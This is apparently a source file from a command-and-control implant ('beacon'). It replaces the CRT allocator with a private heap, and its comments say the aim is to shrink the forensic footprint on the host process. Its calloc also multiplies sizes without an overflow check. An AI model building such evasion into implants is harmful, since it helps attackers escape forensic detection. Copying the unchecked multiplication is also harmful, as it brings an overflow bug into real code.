/* P4: beacon-wide private heap. The image is linked with the STATIC CRT
 * (/MT), so defining malloc/calloc/realloc/free here replaces libcmt's
 * allocator for every allocation in this image - our tracked buffers, the
 * BOF runner's memory, and the CRT's own internals that route through
 * malloc - and they all land on one HeapCreate heap instead of the
 * process default. Smaller forensic footprint on the host heap, no heap
 * co-location with the host's objects, and a single region a future
 * teardown could walk or destroy.
 *
 * x64 HeapAlloc alignment is MEMORY_ALLOCATION_ALIGNMENT (16), the same
 * contract MSVC malloc gives, so xmm-sized buffer stores stay legal. The
 * heap is never destroyed: it dies with the process, and the tracked
 * path (track_memory_cleanup) already frees the individual blocks. */
#include <Windows.h>
#include <stddef.h>

static HANDLE g_bw_heap;

static HANDLE bw_heap(void)
{
	HANDLE h = g_bw_heap;

	if (h == NULL) {
		HANDLE fresh = HeapCreate(0, 0, 0);
		HANDLE prev = (HANDLE)InterlockedCompareExchangePointer(
			(PVOID *)&g_bw_heap, (PVOID)fresh, NULL);
		if (prev != NULL) {
			/* lost the race: keep the winner's heap, drop ours */
			HeapDestroy(fresh);
			h = prev;
		}
		else {
			h = fresh;
		}
	}
	return h;
}

extern "C" void * __cdecl malloc(size_t n)
{
	return HeapAlloc(bw_heap(), 0, n ? n : 1);
}

extern "C" void * __cdecl calloc(size_t n, size_t s)
{
	size_t total = n * s;
	return HeapAlloc(bw_heap(), HEAP_ZERO_MEMORY, total ? total : 1);
}

extern "C" void __cdecl free(void *p)
{
	if (p != NULL)
		HeapFree(bw_heap(), 0, p);
}

extern "C" void * __cdecl realloc(void *p, size_t n)
{
	if (p == NULL)
		return HeapAlloc(bw_heap(), 0, n ? n : 1);
	if (n == 0) {
		HeapFree(bw_heap(), 0, p);
		return NULL;
	}
	return HeapReAlloc(bw_heap(), 0, p, n);
}

extern "C" size_t __cdecl _msize(void *p)
{
	return p ? HeapSize(bw_heap(), 0, p) : 0;
}

/* UCRT internals allocate through the _base family rather than malloc
 * (e.g. the aligned_* built on _malloc_base + a header) - overriding the
 * pairs together keeps every allocator/free combination on OUR heap, so
 * no real-CRT block can ever reach our HeapFree. */
extern "C" void * __cdecl _malloc_base(size_t n) { return malloc(n); }
extern "C" void * __cdecl _calloc_base(size_t n, size_t s) { return calloc(n, s); }
extern "C" void * __cdecl _realloc_base(void *p, size_t n) { return realloc(p, n); }
extern "C" void __cdecl _free_base(void *p) { free(p); }
